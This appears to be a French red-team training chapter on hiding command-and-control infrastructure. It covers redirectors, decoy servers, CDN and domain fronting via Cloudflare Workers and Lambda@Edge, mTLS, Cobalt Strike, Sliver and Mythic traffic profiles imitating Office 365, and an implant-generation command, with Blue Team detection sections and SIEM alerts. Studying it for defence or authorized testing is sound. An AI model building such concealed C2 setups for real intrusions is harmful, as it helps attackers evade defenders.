    - Vérifier la présence/valeur de headers spécifiques attendus par le C2 (ex: `Cookie`, `X-Custom-Header`).
    - Bloquer les requêtes avec des headers suspects.
    ```apache
    # Apache: Bloquer si un header spécifique n'est pas présent
    RewriteCond %{HTTP:X-Expected-Header} ^$
    RewriteRule ^ - [F,L]
    ```
    ```nginx
    # Nginx: Bloquer si un header spécifique n'est pas présent
    if ($http_x_expected_header = "") {
        return 403;
    }
    ```

2.  **Filtrage basé sur la géolocalisation IP :**
    - Utiliser des modules comme `mod_geoip` (Apache) ou `ngx_http_geoip_module` (Nginx) pour autoriser/bloquer des pays.
    - Nécessite une base de données GeoIP (ex: MaxMind).
    ```apache
    # Apache (exemple avec mod_geoip)
    GeoIPEnable On
    GeoIPDBFile /usr/share/GeoIP/GeoIP.dat
    RewriteCond %{ENV:GEOIP_COUNTRY_CODE} !^(US|CA|GB)$
    RewriteRule ^ - [F,L] # Autoriser uniquement US, CA, GB
    ```
    ```nginx
    # Nginx (exemple avec ngx_http_geoip_module)
    geoip_country /usr/share/GeoIP/GeoIP.dat;
    map $geoip_country_code $allowed_country {
        default 0;
        US 1;
        CA 1;
        GB 1;
    }
    if ($allowed_country = 0) {
        return 403;
    }
    ```

3.  **Utilisation de `iptables`/`ufw` pour le filtrage au niveau réseau :**
    - Bloquer les ports non nécessaires.
    - Limiter les connexions entrantes aux ports 80/443.
    - (Optionnel) Filtrer les IPs sources connues pour être malveillantes ou appartenant à des scanners.
    ```bash
    # Exemple UFW (Uncomplicated Firewall)
    sudo ufw default deny incoming
    sudo ufw default allow outgoing
    sudo ufw allow ssh # Ou port spécifique
    sudo ufw allow http
    sudo ufw allow https
    sudo ufw enable
    
    # Exemple iptables (plus complexe)
    sudo iptables -P INPUT DROP
    sudo iptables -P FORWARD DROP
    sudo iptables -P OUTPUT ACCEPT
    sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
    sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT # SSH
    sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT # HTTP
    sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT # HTTPS
    sudo iptables -A INPUT -i lo -j ACCEPT # Loopback
    # Sauvegarder les règles
    ```

4.  **Serveur Leurre (Decoy Server) :**
    - Configurer un serveur web simple (ex: un blog WordPress par défaut, une page Nginx/Apache par défaut) sur le redirecteur.
    - Rediriger tout le trafic non-C2 (bloqué par les règles de filtrage) vers ce serveur leurre.
    - Objectif : Faire croire aux scanners ou aux analystes que le serveur est légitime et non un redirecteur C2.
    ```nginx
    # Nginx: Proxy vers un leurre local sur le port 8080
    location / {
        proxy_pass http://127.0.0.1:8080;
        # ... autres headers proxy ...
    }
    ```

### Vue Blue Team / logs générés / alertes SIEM

#### Détection des redirecteurs

1.  **Analyse du trafic réseau :**
    - Identification de connexions persistantes vers des domaines/IPs spécifiques sur les ports 80/443.
    - Analyse des modèles de trafic (beaconing) : taille des paquets, intervalles, jitter.
    - Analyse des certificats SSL (auto-signés, Let's Encrypt sur des domaines suspects).
    - Analyse des headers HTTP (User-Agents inhabituels, headers C2 spécifiques).

2.  **Analyse des logs DNS :**
    - Requêtes DNS fréquentes vers des domaines suspects ou nouvellement enregistrés.
    - Utilisation de techniques de DNS rapide (Fast Flux).

3.  **Analyse des logs Proxy/Pare-feu :**
    - Connexions vers des catégories de domaines suspectes (nouvellement enregistrés, non catégorisés).
    - Volume de trafic anormal vers certaines destinations.

4.  **Scanning et OSINT :**
    - Scanner les IPs suspectes pour identifier les services ouverts.
    - Rechercher des informations sur les domaines/IPs (Whois, historique, réputation).
    - Tenter d'accéder au serveur avec différents User-Agents ou chemins URI pour détecter le filtrage.

#### Traces laissées par les redirecteurs

-   **Logs du serveur web (Apache/Nginx) :** Même si minimisés (`/dev/null`), des erreurs critiques peuvent être loguées. Si les logs d'accès sont activés (pour le debug ou par erreur), ils contiennent les IPs sources, User-Agents, URIs, etc.
-   **Logs système :** Logs d'installation des paquets, logs d'authentification SSH, logs `ufw`/`iptables`.
-   **Artefacts réseau :** Entrées dans les tables `conntrack`.

#### Alertes SIEM typiques

**Alerte de Beaconing C2 :**
```
[ALERT] Potential C2 Beaconing Detected
Source IP: 10.1.1.50 (Internal Host)
Destination IP: REDIRECTOR_IP
Destination Port: 443
Time: Periodic (Interval: 60s +/- 5s)
Details: Consistent outbound connection pattern detected to external IP over HTTPS. Low data volume, regular intervals.
Severity: Medium
```

**Alerte de connexion vers un domaine suspect :**
```
[ALERT] Connection to Suspicious Domain Category
Source IP: 10.1.1.50 (Internal Host)
Destination Domain: yourdomain.com
Destination IP: REDIRECTOR_IP
Category: Newly Registered Domain / Uncategorized
Time: 2023-05-15 14:23:45
Details: Outbound connection to a domain with low reputation or recent registration.
Severity: Low/Medium
```

**Alerte de certificat SSL suspect :**
```
[ALERT] Suspicious SSL Certificate Encountered
Source IP: 10.1.1.50 (Internal Host)
Destination IP: REDIRECTOR_IP
Destination Port: 443
Time: 2023-05-15 14:23:45
Details: SSL connection established using a Let's Encrypt certificate for a potentially suspicious domain (yourdomain.com).
Severity: Low
```

### Pièges classiques et erreurs à éviter

1.  **Exposition directe du Team Server :** Ne jamais faire pointer les implants directement vers l'IP du serveur C2.
2.  **Configuration de filtrage insuffisante :** Des règles de filtrage trop permissives permettent aux analystes d'accéder au serveur C2 ou d'identifier le framework utilisé.
3.  **Utilisation de domaines/IPs brûlés :** Réutiliser des indicateurs de compromission (IoCs) connus.
4.  **Certificats SSL par défaut ou suspects :** Utiliser des certificats auto-signés ou des certificats Let's Encrypt sur des domaines clairement malveillants.
5.  **Logging excessif :** Laisser les logs par défaut activés sur les redirecteurs peut fournir des informations précieuses aux enquêteurs en cas de saisie.
6.  **Manque de serveur leurre :** Un redirecteur qui retourne des erreurs 403/404 pour tout trafic non-C2 est plus suspect qu'un serveur qui affiche une page web simple.
7.  **Configuration identique sur plusieurs redirecteurs :** Facilite l'identification de l'ensemble de l'infrastructure si un redirecteur est analysé.

### OPSEC Tips : Configuration discrète des redirecteurs

1.  **Choisir des domaines crédibles :** Utiliser des domaines vieillis (aged domains) ou des domaines qui correspondent à une activité légitime (ex: marketing, blog technique). Éviter les noms de domaine aléatoires ou suspects.
2.  **Utiliser des certificats SSL validés (EV si possible) :** Bien que coûteux, ils ajoutent une couche de crédibilité.
3.  **Personnaliser les règles de filtrage :** Adapter précisément les règles (URI, User-Agent, Headers) au profil de communication de votre C2.
4.  **Implémenter un serveur leurre convaincant :** Cloner un site web légitime ou héberger une application simple.
5.  **Varier les configurations :** Utiliser des configurations légèrement différentes (Apache/Nginx, règles de filtrage) sur chaque redirecteur.
6.  **Sécuriser la connexion Redirecteur -> Team Server :** Utiliser un VPN, un tunnel SSH ou mTLS pour protéger ce lien.
7.  **Rotation régulière :** Prévoir de remplacer régulièrement les redirecteurs (IPs, domaines).
8.  **Minimiser les services :** Ne faire tourner que les services strictement nécessaires (Apache/Nginx) sur le redirecteur.
9.  **Utiliser des fournisseurs de VPS variés :** Ne pas héberger tous les redirecteurs chez le même fournisseur.

### Points clés (Partie 1)

-   Une architecture C2 moderne est multi-niveaux pour la furtivité et la résilience.
-   Les redirecteurs sont essentiels pour masquer l'IP du serveur C2 et filtrer le trafic.
-   Apache (`mod_proxy`, `mod_rewrite`) et Nginx (`proxy_pass`) sont couramment utilisés pour les redirecteurs HTTP/S.
-   Le filtrage avancé (Headers, GeoIP, URI, User-Agent) est crucial pour bloquer les analyses.
-   La configuration OPSEC inclut la minimisation des logs, l'utilisation de certificats valides, et la mise en place de serveurs leurres.
-   Les Blue Teams détectent les redirecteurs via l'analyse du trafic, des logs DNS/Proxy, et l'OSINT.
-   Éviter les erreurs classiques comme l'exposition directe du C2 ou un filtrage insuffisant.

**(Fin de la Partie 1. La suite couvrira les CDN, le Domain Fronting, les profils C2 avancés, etc.)**
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 21 : OPSEC Niveau 3 - Infrastructure C2 & OPSEC complexe (Partie 2)

## Partie 2 : CDN/Edge, Domain Fronting et Profiles C2 avancés

### Utilisation des CDN et Edge Services

#### Principes et avantages des CDN pour l'OPSEC

1. **Qu'est-ce qu'un CDN (Content Delivery Network) ?**
   - Réseau distribué de serveurs qui délivrent du contenu web aux utilisateurs en fonction de leur localisation géographique.
   - Exemples : Cloudflare, Fastly, Akamai, AWS CloudFront, Azure CDN.

2. **Avantages OPSEC des CDN :**
   - **Masquage de l'origine :** Le CDN cache l'adresse IP réelle du serveur d'origine (redirecteur ou C2).
   - **Légitimité :** Trafic mélangé avec le trafic légitime vers des services populaires.
   - **Résilience :** Difficile à bloquer sans affecter d'autres services légitimes.
   - **Performance :** Réduit la latence, ce qui peut rendre le trafic C2 moins suspect.
   - **Protection DDoS :** Protège l'infrastructure contre les attaques de déni de service.

3. **Considérations de sécurité :**
   - Les CDN peuvent inspecter le trafic (sauf si chiffré de bout en bout).
   - Certains CDN ont des politiques strictes contre les activités malveillantes.
   - Les CDN peuvent conserver des logs détaillés.

#### Configuration d'un CDN pour le C2

##### Cloudflare (Exemple le plus courant)

1. **Prérequis :**
   - Un compte Cloudflare (gratuit ou payant).
   - Un nom de domaine enregistré.
   - Un serveur web (redirecteur) configuré.

2. **Configuration de base :**
   ```
   # Étapes générales
   1. Ajouter le domaine à Cloudflare
   2. Mettre à jour les serveurs DNS du domaine pour utiliser ceux de Cloudflare
   3. Configurer les enregistrements DNS pour pointer vers le redirecteur
   4. Activer le proxy Cloudflare (icône orange dans le tableau de bord)
   5. Configurer les règles de pare-feu et les paramètres SSL
   ```

3. **Paramètres SSL recommandés :**
   - **Mode SSL :** Full (strict) - Chiffrement entre le client et Cloudflare, et entre Cloudflare et l'origine.
   - **Certificats d'origine :** Utiliser Let's Encrypt sur le redirecteur.
   - **HSTS :** Activé avec précaution (peut rendre difficile la désactivation de Cloudflare).

4. **Règles de pare-feu Cloudflare :**
   - Créer des règles pour filtrer le trafic indésirable.
   - Exemple : Bloquer les User-Agents de scanners connus.
   ```
   # Exemple de règle dans l'interface Cloudflare
   If (User-Agent contains "nmap" or "nikto" or "sqlmap")
   Then Block
   ```

5. **Workers Cloudflare (Avancé) :**
   - Scripts JavaScript exécutés sur le réseau edge de Cloudflare.
   - Permet un filtrage et une manipulation avancés des requêtes.
   ```javascript
   // Exemple de Worker Cloudflare pour filtrage avancé
   addEventListener('fetch', event => {
     event.respondWith(handleRequest(event.request))
   })
   
   async function handleRequest(request) {
     // Vérifier le User-Agent
     const userAgent = request.headers.get('User-Agent')
     if (!userAgent || userAgent.includes('scanner')) {
       return new Response('Access denied', { status: 403 })
     }
     
     // Vérifier un header personnalisé (utilisé par le C2)
     const customHeader = request.headers.get('X-Custom-Header')
     if (customHeader !== 'expected_value') {
       // Rediriger vers un site leurre
       return Response.redirect('https://legitimate-looking-site.com', 302)
     }
     
     // Si tout est OK, proxy vers l'origine
     return fetch(request)
   }
   ```

##### AWS CloudFront

1. **Prérequis :**
   - Un compte AWS.
   - Un certificat SSL dans AWS Certificate Manager (ACM).
   - Un serveur web (redirecteur) accessible depuis Internet.

2. **Configuration de base :**
   ```
   # Étapes générales
   1. Créer une distribution CloudFront
   2. Configurer l'origine (redirecteur)
   3. Configurer les comportements du cache
   4. Associer un certificat SSL
   5. Configurer les enregistrements DNS pour pointer vers la distribution CloudFront
   ```

3. **Paramètres de sécurité recommandés :**
   - **Protocole d'origine :** HTTPS uniquement.
   - **TLS :** TLSv1.2 minimum.
   - **Restriction géographique :** Limiter l'accès à certains pays si pertinent pour l'opération.

4. **Lambda@Edge (Avancé) :**
   - Fonctions Lambda exécutées sur le réseau edge d'AWS.
   - Permet un filtrage et une manipulation avancés des requêtes.
   ```javascript
   // Exemple de fonction Lambda@Edge pour filtrage
   exports.handler = (event, context, callback) => {
     const request = event.Records[0].cf.request;
     
     // Vérifier le User-Agent
     const userAgent = request.headers['user-agent'][0].value;
     if (userAgent.includes('scanner')) {
       const response = {
         status: '403',
         statusDescription: 'Forbidden',
         body: 'Access denied'
       };
       callback(null, response);
       return;
     }
     
     // Continuer avec la requête originale
     callback(null, request);
   };
   ```

### Domain Fronting et techniques avancées

#### Principes du Domain Fronting

1. **Définition :**
   - Technique permettant de masquer le véritable domaine de destination d'une requête HTTPS.
   - Exploite la différence entre le SNI (Server Name Indication) dans la couche TLS et le header `Host` dans la couche HTTP.
   - Permet de contourner la censure et les filtres basés sur le domaine.

2. **Fonctionnement :**
   ```
   # Exemple simplifié
   1. Le client se connecte à un service CDN (ex: *.cloudfront.net) en utilisant un domaine légitime dans le SNI (ex: allowed-domain.com)
   2. Une fois la connexion TLS établie, le client envoie une requête HTTP avec un header Host différent (ex: c2-domain.com)
   3. Le CDN route la requête vers le backend associé à c2-domain.com
   ```

3. **Statut actuel :**
   - De nombreux CDN ont désactivé ou restreint le domain fronting.
   - Certains services permettent encore des variantes de cette technique.
   - Nécessite une surveillance constante des changements de politique des fournisseurs.

#### Mise en œuvre du Domain Fronting (Techniques historiques et actuelles)

##### Cloudflare Workers (Alternative moderne au Domain Fronting classique)

1. **Principe :**
   - Utiliser un Worker Cloudflare pour router le trafic vers un backend non exposé directement.
   - Ne dépend pas du mécanisme SNI vs Host, mais offre un résultat similaire.

2. **Configuration :**
   ```javascript
   // Exemple de Worker Cloudflare pour "pseudo domain fronting"
   addEventListener('fetch', event => {
     event.respondWith(handleRequest(event.request))
   })
   
   async function handleRequest(request) {
     // Vérifier si la requête est légitime (ex: header secret)
     const secretHeader = request.headers.get('X-Secret-Header')
     if (secretHeader === 'correct_value') {
       // Rediriger vers le C2 réel
       const url = new URL(request.url)
       url.hostname = 'hidden-c2-backend.com'
       
       const modifiedRequest = new Request(url.toString(), {
         method: request.method,
         headers: request.headers,
         body: request.body
       })
       
       return fetch(modifiedRequest)
     }
     
     // Sinon, servir un contenu légitime
     return fetch('https://legitimate-content.com')
   }
   ```

##### AWS CloudFront (Technique historique, partiellement restreinte)

1. **Configuration historique :**
   ```
   # Étapes générales (peut ne plus fonctionner complètement)
   1. Créer une distribution CloudFront avec plusieurs origines
   2. Configurer un comportement par défaut pointant vers un site légitime
   3. Configurer un comportement spécifique pour le chemin C2 (ex: /api/*) pointant vers le backend C2
   4. Utiliser un domaine légitime dans le SNI, mais inclure le domaine C2 dans le header Host
   ```

2. **Adaptation moderne :**
   - Utiliser Lambda@Edge pour router le trafic en fonction de headers ou de patterns spécifiques.
   - Configurer plusieurs distributions avec des origines différentes.

##### Azure Front Door (Alternative moderne)

1. **Configuration :**
   ```
   # Étapes générales
   1. Créer un service Azure Front Door
   2. Configurer plusieurs backends (légitime et C2)
   3. Définir des règles de routage basées sur des patterns d'URL ou des headers
   4. Utiliser des règles WAF pour filtrer le trafic indésirable
   ```

#### TLS Mutual Authentication (mTLS)

1. **Principes :**
   - Authentification bidirectionnelle où le client et le serveur vérifient l'identité de l'autre via des certificats.
   - Ajoute une couche de sécurité supplémentaire au-delà du HTTPS standard.
   - Rend l'interception et l'analyse du trafic plus difficiles.

2. **Avantages OPSEC :**
   - Empêche les connexions non autorisées au C2.
   - Complique l'analyse du trafic par les équipes de sécurité.
   - Peut contourner certains proxys d'inspection SSL.

3. **Configuration avec Nginx :**
   ```nginx
   # Configuration Nginx pour mTLS
   server {
       listen 443 ssl;
       server_name c2domain.com;
       
       # Certificats serveur
       ssl_certificate /path/to/server.crt;
       ssl_certificate_key /path/to/server.key;
       
       # Validation du certificat client
       ssl_client_certificate /path/to/ca.crt;
       ssl_verify_client on;
       
       # Paramètres SSL renforcés
       ssl_protocols TLSv1.2 TLSv1.3;
       ssl_ciphers HIGH:!aNULL:!MD5;
       ssl_prefer_server_ciphers on;
       
       location / {
           # Proxy vers le backend C2
           proxy_pass http://backend_c2;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
       }
   }
   ```

4. **Configuration avec Apache :**
   ```apache
   # Configuration Apache pour mTLS
   <VirtualHost *:443>
       ServerName c2domain.com
       
       # Certificats serveur
       SSLEngine on
       SSLCertificateFile /path/to/server.crt
       SSLCertificateKeyFile /path/to/server.key
       
       # Validation du certificat client
       SSLCACertificateFile /path/to/ca.crt
       SSLVerifyClient require
       SSLVerifyDepth 1
       
       # Paramètres SSL renforcés
       SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
       SSLCipherSuite HIGH:!aNULL:!MD5
       SSLHonorCipherOrder on
       
       ProxyPass / http://backend_c2/
       ProxyPassReverse / http://backend_c2/
   </VirtualHost>
   ```

5. **Génération des certificats :**
   ```bash
   # Création d'une autorité de certification (CA)
   openssl genrsa -out ca.key 4096
   openssl req -new -x509 -days 365 -key ca.key -out ca.crt
   
   # Création du certificat serveur
   openssl genrsa -out server.key 2048
   openssl req -new -key server.key -out server.csr
   openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt
   
   # Création du certificat client
   openssl genrsa -out client.key 2048
   openssl req -new -key client.key -out client.csr
   openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key -set_serial 02 -out client.crt
   
   # Conversion au format PKCS#12 pour les clients
   openssl pkcs12 -export -out client.p12 -inkey client.key -in client.crt -certfile ca.crt
   ```

### Profiles C2 et Traffic Shaping avancés

#### Malleable C2 Profiles (Cobalt Strike)

1. **Principes :**
   - Profiles qui définissent comment le trafic C2 apparaît sur le réseau.
   - Permettent de personnaliser les requêtes HTTP, les headers, le timing, etc.
   - Objectif : Imiter du trafic légitime pour éviter la détection.

2. **Composants d'un profile Malleable C2 :**
   - **HTTP-GET :** Format des requêtes pour récupérer des tâches.
   - **HTTP-POST :** Format des requêtes pour envoyer des résultats.
   - **Stager :** Configuration du stager initial.
   - **Data Transformation :** Encodage et transformation des données.
   - **Sleep :** Timing et jitter pour les communications.

3. **Exemple de profile (simplifié) :**
   ```
   # Exemple de profile Malleable C2 imitant le trafic Office 365
   
   set sleeptime "60000";  # 60 secondes
   set jitter    "20";     # 20% de variation
   set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299";
   
   http-get {
       set uri "/owa/auth/15.0.847/themes/resources/";
       
       client {
           header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
           header "Host" "outlook.office365.com";
           header "Cookie" "X-OWA-CANARY=RANDOM_STRING_HERE;";
           
           metadata {
               base64;
               prepend "canary=";
               append "&_=";
               parameter "t";
           }
       }
       
       server {
           header "X-FEServer" "MWHPR06CA0058";
           header "X-BEServer" "BY2PR06MB549";
           header "X-OWA-Version" "15.0.847.32";
           header "X-DiagInfo" "BY2PR06MB549";
           
           output {
               base64;
               prepend "<!DOCTYPE html><html><head>";
               append "</head><body></body></html>";
               print;
           }
       }
   }
   
   http-post {
       set uri "/owa/auth/15.0.847/scripts/premium/";
       
       client {
           header "Accept" "*/*";
           header "Content-Type" "application/x-www-form-urlencoded";
           
           id {
               parameter "id";
           }
           
           output {
               base64;
               prepend "data=";
               print;
           }
       }
       
       server {
           header "X-FEServer" "MWHPR06CA0058";
           header "X-BEServer" "BY2PR06MB549";
           
           output {
               base64;
               prepend "{\"result\":\"";
               append "\",\"status\":\"success\"}";
               print;
           }
       }
   }
   ```

4. **Bonnes pratiques pour les profiles :**
   - **Imiter des services légitimes :** Office 365, Google, Dropbox, etc.
   - **Cohérence :** Tous les aspects (URI, headers, contenu) doivent être cohérents avec le service imité.
   - **Variabilité :** Utiliser jitter, rotation des User-Agents, etc.
   - **Test :** Vérifier que le profile n'est pas détecté par les outils de sécurité courants.

#### Sliver Profiles et Badgers

1. **Principes :**
   - Sliver est un framework C2 moderne avec des capacités similaires à Cobalt Strike.
   - Les "badgers" sont l'équivalent des beacons dans Sliver.

2. **Configuration des profiles HTTP :**
   ```
   # Exemple de commandes Sliver pour configurer un profile HTTP
   sliver > profiles new --name office365 --http
   sliver > profiles http-config --name office365 --host outlook.office365.com --uri /owa/auth/
   sliver > profiles http-headers --name office365 --header "Accept: text/html,application/xhtml+xml"
   sliver > profiles http-headers --name office365 --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
   ```

3. **Génération d'implants avec profiles :**
   ```
   # Exemple de génération d'implant avec profile
   sliver > generate --profile office365 --http --os windows --arch amd64 --save /tmp/implant.exe
   ```

#### Mythic C2 Profiles

1. **Principes :**
   - Mythic est un framework C2 moderne et modulaire.
   - Utilise des "C2 Profiles" pour définir les canaux de communication.

2. **Types de profiles :**
   - **HTTP :** Communication standard via HTTP/HTTPS.
   - **Websockets :** Communication bidirectionnelle persistante.
   - **DNS :** Communication via requêtes DNS.
   - **SMB :** Communication via le protocole SMB (interne).

3. **Exemple de configuration HTTP :**
   ```json
   // Exemple simplifié de configuration HTTP dans Mythic
   {
     "name": "office365",
     "description": "Office 365 lookalike profile",
     "config": {
       "headers": {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml",
         "Host": "outlook.office365.com"
       },
       "urls": {
         "get_url": "/owa/auth/15.0.847/themes/resources/",
         "post_url": "/owa/auth/15.0.847/scripts/premium/"
       },
       "jitter": 20,
       "interval": 60
     }
   }
   ```

#### Techniques avancées de Traffic Shaping

1. **Jitter et Sleep :**
   - **Jitter :** Variation aléatoire des intervalles de communication pour éviter les patterns réguliers.
   - **Sleep :** Temps d'attente entre les communications.
   ```
   # Exemple de configuration (Cobalt Strike)
   set sleeptime "300000";  # 5 minutes
   set jitter    "35";      # 35% de variation
   ```

2. **Randomisation des headers :**
   - Rotation des User-Agents pour simuler différents navigateurs.
   - Variation des headers Accept, Accept-Language, etc.
   ```
   # Exemple de rotation de User-Agents
   set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";
   set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59";
   set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15";
   ```

3. **Taille des paquets :**
   - Variation de la taille des paquets pour éviter les signatures basées sur la taille.
   - Ajout de padding aléatoire.
   ```
   # Exemple de padding (Cobalt Strike)
   http-get {
       client {
           metadata {
               mask;
               base64url;
               prepend "session=";
               header "Cookie";
           }
           
           # Padding aléatoire
           parameter "pad" "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
       }
   }
   ```

4. **Encodage et transformation des données :**
   - Utilisation de différentes méthodes d'encodage (base64, XOR, etc.).
   - Transformation des données pour ressembler à du contenu légitime.
   ```
   # Exemple de transformation (Cobalt Strike)
   http-post {
       client {
           output {
               mask;
               base64url;
               prepend "{\"data\":\"";
               append "\"}";
               print;
           }
       }
   }
   ```

5. **Utilisation de protocoles alternatifs :**
   - DNS (requêtes TXT, AAAA, etc.).
   - ICMP (ping).
   - WebSockets.
   - HTTP/2 et HTTP/3.

### Vue Blue Team / logs générés / alertes SIEM

#### Détection du Domain Fronting et des CDN

1. **Analyse du trafic SSL/TLS :**
   - Discordance entre le SNI et le header Host (si visible).
   - Certificats émis par des CDN connus.
   - Fingerprinting TLS (JA3).

2. **Analyse des logs proxy :**
   - Connexions fréquentes vers des domaines CDN.
   - Headers HTTP suspects ou incohérents.
   - Patterns de communication inhabituels.

3. **Détection basée sur le comportement :**
   - Communications régulières vers des domaines CDN sans utilisation légitime connue.
   - Trafic sortant vers des CDN depuis des systèmes qui ne devraient pas y accéder.

#### Détection des profiles C2 et du Traffic Shaping

1. **Analyse des patterns de communication :**
   - Beaconing régulier, même avec jitter.
   - Communications à intervalles fixes ou semi-fixes.
   - Volumes de données constants ou prévisibles.

2. **Analyse des headers HTTP :**
   - Headers incohérents avec le User-Agent déclaré.
   - Combinaisons de headers inhabituelles.
   - Headers imitant des services légitimes mais avec des différences subtiles.

3. **Analyse du contenu :**
   - Données encodées dans des champs inhabituels.
   - Contenu qui semble légitime mais contient des anomalies.
   - Utilisation excessive de padding ou d'encodage.

#### Alertes SIEM typiques

**Alerte de Domain Fronting potentiel :**
```
[ALERT] Potential Domain Fronting Detected
Source IP: 10.1.1.50 (Internal Host)
Destination IP: 104.18.2.2 (Cloudflare)
SNI: legitimate-service.com
Host Header: suspicious-domain.com
Time: 2023-05-15 14:23:45
Details: Discrepancy between TLS SNI and HTTP Host header detected.
Severity: High
```

**Alerte de beaconing via CDN :**
```
[ALERT] Suspicious Beaconing to CDN Detected
Source IP: 10.1.1.50 (Internal Host)
Destination: cdn.cloudflare.net
Pattern: Regular intervals (300s +/- 35%)
Duration: 4 hours
Volume: Consistent small packets (2-5 KB)
Time: 2023-05-15 14:00:00 - 18:00:00
Details: Host is regularly communicating with CDN service with consistent timing pattern.
Severity: Medium
```

**Alerte de profile C2 connu :**
```
[ALERT] Known C2 Profile Pattern Detected
Source IP: 10.1.1.50 (Internal Host)
Destination: office365-cdn.com
Pattern: Matches known Cobalt Strike Office 365 profile
Headers: X-FEServer, X-BEServer (specific to profile)
Time: 2023-05-15 14:23:45
Details: HTTP traffic matches known C2 communication profile.
Severity: Critical
```

### Pièges classiques et erreurs à éviter

1. **Utilisation de profiles C2 par défaut :** Les profiles non personnalisés sont facilement détectables par les solutions de sécurité modernes.
2. **Beaconing trop régulier :** Même avec du jitter, un intervalle de base fixe peut être détecté sur une période suffisamment longue.
3. **Incohérence dans l'imitation :** Imiter un service mais avec des headers ou des comportements qui ne correspondent pas au service réel.
4. **Trafic excessif :** Générer trop de trafic ou des communications trop fréquentes attire l'attention.
5. **Manque de contextualisation :** Ne pas adapter le profile au contexte de la cible (ex: imiter Office 365 dans une organisation qui n'utilise pas Microsoft 365).
6. **Négligence des métadonnées :** Oublier de personnaliser certains aspects comme les certificats, les User-Agents, ou les formats de données.
7. **Réutilisation d'infrastructure :** Utiliser les mêmes domaines, IPs ou profiles pour différentes opérations.

### OPSEC Tips : Profiles C2 furtifs

1. **Imiter le trafic légitime de la cible :**
   - Analyser le trafic légitime de l'organisation cible.
   - Reproduire fidèlement les headers, timing, et patterns observés.
   - Utiliser des services réellement utilisés par la cible.

2. **Personnalisation poussée :**
   - Créer des profiles uniques pour chaque opération.
   - Modifier tous les aspects du profile (pas seulement les headers).
   - Tester les profiles contre des solutions de détection modernes.

3. **Adaptation dynamique :**
   - Varier les comportements en fonction de l'heure, du jour, etc.
   - Réduire l'activité pendant les heures non-ouvrées.
   - Adapter le volume de trafic au contexte.

4. **Utilisation de canaux multiples :**
   - Alterner entre différents protocoles (HTTP, DNS, etc.).
   - Utiliser plusieurs domaines et redirecteurs.
   - Implémenter des mécanismes de fallback.

5. **Script de génération de profile aléatoire :**
   ```python
   # Exemple simplifié de script pour générer un profile C2 aléatoire
   import random
   import string
   import json
   
   def random_string(length=10):
       return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
   
   def generate_random_profile():
       user_agents = [
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
       ]
       
       services = ["office365", "google", "dropbox", "github"]
       service = random.choice(services)
       
       uris = {
           "office365": ["/owa/auth/", "/owa/mail/", "/owa/calendar/"],
           "google": ["/mail/", "/drive/", "/docs/"],
           "dropbox": ["/files/", "/sharing/", "/paper/"],
           "github": ["/repos/", "/users/", "/orgs/"]
       }
       
       profile = {
           "name": f"{service}_{random_string(5)}",
           "sleep_time": random.randint(30, 300),
           "jitter": random.randint(10, 40),
           "user_agent": random.choice(user_agents),
           "http_get": {
               "uri": random.choice(uris[service]) + random_string(8) + "." + random.choice(["js", "css", "png"]),
               "headers": {
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5",
                   "Referer": f"https://{service}.com/" + random_string(12)
               }
           },
           "http_post": {
               "uri": random.choice(uris[service]) + random_string(8) + "." + random.choice(["php", "aspx", "jsp"]),
               "headers": {
                   "Content-Type": random.choice(["application/json", "application/x-www-form-urlencoded"])
               }
           }
       }
       
       return profile
   
   # Générer et afficher un profile aléatoire
   random_profile = generate_random_profile()
   print(json.dumps(random_profile, indent=2))
   ```

### Points clés (Partie 2)

- Les CDN et Edge Services ajoutent une couche de légitimité et de protection à l'infrastructure C2.
- Le Domain Fronting (et ses variantes modernes) permet de masquer la véritable destination du trafic.
- Le TLS Mutual Authentication (mTLS) renforce la sécurité et complique l'analyse du trafic.
- Les profiles C2 avancés (Malleable C2, Sliver, Mythic) permettent de personnaliser l'apparence du trafic.
- Le Traffic Shaping (jitter, randomisation, padding) aide à éviter la détection basée sur les patterns.
- Les Blue Teams détectent ces techniques via l'analyse du trafic SSL/TLS, des logs proxy, et des patterns de communication.
- Les erreurs courantes incluent l'utilisation de profiles par défaut, le beaconing trop régulier, et l'incohérence dans l'imitation.

**(Fin de la Partie 2. La suite couvrira la résilience & rotation, l'OPSEC réseau, et l'anti-forensics.)**
